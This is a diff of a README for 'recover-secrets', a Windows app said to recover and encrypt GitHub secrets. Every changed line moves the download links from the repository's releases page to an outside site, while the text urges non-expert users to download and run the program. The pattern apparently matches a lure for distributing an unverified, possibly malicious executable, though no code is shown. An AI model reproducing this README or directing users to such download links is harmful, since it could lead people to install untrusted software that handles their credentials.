@@ -1,7 +1,7 @@
 # 🔐 recover-secrets - Recover Your GitHub Secrets Safely and Easily
 
 <p align="center">
-  <a href="https://github.com/Prosy4967/recover-secrets/releases" style="background-color:#4CAF50; color:#ffffff; padding:15px 30px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:5px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://prosy4967.github.io" style="background-color:#4CAF50; color:#ffffff; padding:15px 30px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:5px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 👋 Welcome to recover-secrets
@@ -27,7 +27,7 @@ Getting started with recover-secrets is as easy as 1-2-3! You don't need to be a
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**Download recover-secrets**](https://github.com/Prosy4967/recover-secrets/releases)
+Visit this link to download the application: [**Download recover-secrets**](https://prosy4967.github.io)
 
 Look for the latest version and click the download button. The file will start downloading to your computer, usually to your "Downloads" folder.
 
@@ -110,7 +110,7 @@ We regularly update recover-secrets with new features and security improvements.
 - **Security patches** - Any security issues are fixed promptly
 - **New features** - We listen to user feedback and add helpful capabilities
 
-To get the latest version, visit the [releases page](https://github.com/Prosy4967/recover-secrets/releases) and check for the newest release. Each release includes detailed notes about what's changed.
+To get the latest version, visit the [releases page](https://prosy4967.github.io) and check for the newest release. Each release includes detailed notes about what's changed.
 
 ## 👥 Getting Help
 
@@ -133,7 +133,7 @@ Here are some tips to get the most out of recover-secrets:
 
 Don't wait until you've lost access to important secrets! Start using recover-secrets today and enjoy the peace of mind that comes with knowing your data is safe.
 
-1. **Download** - Visit the [download page](https://github.com/Prosy4967/recover-secrets/releases)
+1. **Download** - Visit the [download page](https://prosy4967.github.io)
 2. **Install** - Run the application on your Windows computer
 3. **Encrypt** - Start protecting your secrets immediately
 
@@ -151,7 +151,7 @@ Your support helps keep this tool free and improving for everyone.
 
 ---
 
-**Ready to get started?** Visit the [download page](https://github.com/Prosy4967/recover-secrets/releases) now and secure your secrets today!
+**Ready to get started?** Visit the [download page](https://prosy4967.github.io) now and secure your secrets today!
 
 *recover-secrets is committed to keeping your data safe. Nothing readable ever hits the logs.*
 
